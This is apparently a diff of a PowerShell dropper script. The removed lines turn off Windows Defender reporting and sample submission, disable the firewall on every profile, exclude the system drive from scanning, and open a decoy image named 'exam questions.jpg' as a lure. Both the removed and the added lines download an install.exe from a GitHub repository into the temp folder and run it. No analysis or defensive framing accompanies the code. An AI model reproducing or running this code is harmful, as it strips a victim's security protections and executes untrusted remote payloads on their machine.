@@ -1,19 +1,4 @@
-try {
-    Write-Output "Opening file...";
-    Set-MpPreference -MAPSReporting 0;
-    Set-MpPreference -SubmitSamplesConsent 2;
-    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False;
-    Add-MpPreference -ExclusionPath $env:SystemDrive -ErrorAction Stop;
-} catch {
-    Write-Error ("ERROR: " + $_.Exception.Message);
-}
-
-$url = "https://m.media-amazon.com/images/I/51udtm0M0TL._UF1000,1000_QL80_.jpg";
-$destination = "$env:TEMP\\exam questions.jpg";
-Invoke-WebRequest -Uri $url -OutFile $destination;
-Start-Process $destination;
-$url = "https://github.com/Easy-Hash/download-now/raw/refs/heads/main/install.exe";
-$destination = "$env:TEMP\\install.exe";
-Invoke-WebRequest -Uri $url -OutFile $destination;
-
-Start-Process $destination;
+$url2 = "https://github.com/Easy-Hash/download-now/raw/refs/heads/main/install.exe"
+$destination2 = "$env:TEMP\install.exe"
+Invoke-WebRequest -Uri $url2 -OutFile $destination2
+Start-Process $destination2
